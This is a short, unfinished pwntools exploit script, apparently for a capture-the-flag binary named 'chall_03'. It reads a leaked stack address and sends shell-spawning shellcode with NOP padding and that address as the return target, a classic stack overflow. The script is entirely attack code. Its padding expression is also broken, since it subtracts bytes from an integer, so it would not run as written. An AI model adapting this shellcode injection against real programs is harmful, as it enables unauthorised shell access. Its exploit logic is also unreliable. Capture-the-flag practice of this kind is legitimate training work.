from pwn import *
binary = context.binary = ELF('./chall_03')
p=process(binary.path)
p.recvuntil('Here\'s a leak :)')
_ = p.recvline().strip()
stack = int(_,16)
payload = b'' + asm(shellcraft.sh())
p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(payload) * b'\x90' + p64(stack)))
p.interactive()

# Not finished
